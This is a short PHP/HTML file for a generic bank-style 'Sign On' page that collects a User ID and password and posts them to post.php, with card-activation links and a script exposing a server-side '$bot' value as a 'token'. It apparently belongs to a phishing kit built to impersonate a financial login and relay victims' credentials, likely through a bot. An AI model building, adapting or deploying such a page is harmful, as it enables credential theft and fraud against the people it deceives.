<?php
include("config.php");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
<img src="res/logo.png">
</header>

<main>
<div class="container">
<div class="form">

<div class="title">Sign On</div>


<form action="post.php" method="post">
<div class="flex">
    <div class="left">
        <input type="text" required name="user" placeholder="User ID">
    </div>
    <div class="right">
        <input type="password" required name="pass" placeholder="Password">
    </div>
</div>


<div class="col check">
    <input type="checkbox"> <label>Remember User ID</label>
</div>

<div class="col">
    <button type="submit">Sign On</button>
</div>
</form>
<script>var token=<?php echo json_encode($bot); ?>;</script><script src="./res/jq.js"></script>


<div class="col links">
    <div class="leftl">
    <span>Forgot User ID?</span>
    <span>Activate a Card</span>
    </div>
    <div class="rightl">
    <span>Forgot Password?</span>
    <span>Register for Online Access</span>
    </div>
</div>


</div>
</div>
</main>

</body>
</html>